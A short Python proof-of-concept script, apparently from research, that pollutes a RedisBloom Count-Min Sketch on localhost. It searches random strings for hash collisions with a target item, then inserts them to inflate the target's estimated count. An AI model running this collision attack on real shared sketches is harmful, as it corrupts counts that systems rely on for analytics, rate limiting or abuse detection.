#!/usr/bin/env python3


import redis
import random, string
import sys
from redisbloom.client import Client

redis_host = "localhost"
redis_port = 6379
redis_password = ""

def randomword(length):
   letters = string.ascii_letters.join(string.digits);
   return ''.join(random.choice(letters) for i in range(length))



def redis_attack():

    try:
        
        # connect to Redis server
        # targe item
        target = 'ASDFGHJKLZXCVBNM';

        # rb = Client()
        # rb.cmsInitByDim('dim', 1000, 5)
        # rb.cmsIncrBy('dim', ['foo'], [5])
        # rb.cmsIncrBy('dim', ['foo', 'bar'], [5, 15])
        # msg = rb.cmsQuery('dim', 'foo')
        count = 0
        dbkey = 'cms4'

        rb = Client()
        rb.cmsInitByDim(dbkey,  4096, 4)
        finish = True 

        rb.cmsIncrBy(dbkey, [target], [5])
        estimate =  rb.cmsQuery(dbkey, target)[0];
        set = []

        print(estimate)


        while(finish):

            # update the cms
            random_string = randomword(16)
            estimate = rb.cmsQuery(dbkey, target)[0]
            rb.cmsIncrBy(dbkey, [random_string], [1])
            count = count + 1

            if estimate <  rb.cmsQuery(dbkey, target)[0]:
                print('Element Found!')
                print(random_string)
                set.append(random_string)
                finish = False

                for i in range(10):
                    estimate = rb.cmsQuery(dbkey, target)[0]

                    for x in set:
                        rb.cmsIncrBy(dbkey, [x], [10])


                    if estimate == rb.cmsQuery(dbkey, target)[0]:
                        finish = True
                        print('False positive!')
                        break

                else:
                    print("Finally finished!\n")

        print("Attack set found!")

        for x in set:
            print(x)

        #print(msg)
        print("Test for the attack set... ")
        
        print("Target element estimate before attack -> " + str(rb.cmsQuery(dbkey, target)[0]))

        for x in set:
            print("Inserting..." + x)
            rb.cmsIncrBy(dbkey, [x], [1])

        print("Target element estimate after attack -> " + str(rb.cmsQuery(dbkey, target)[0]))
        print("Operations needed -> " + str(count))
    except Exception as e:
        print(e)


if __name__ == '__main__':
    redis_attack()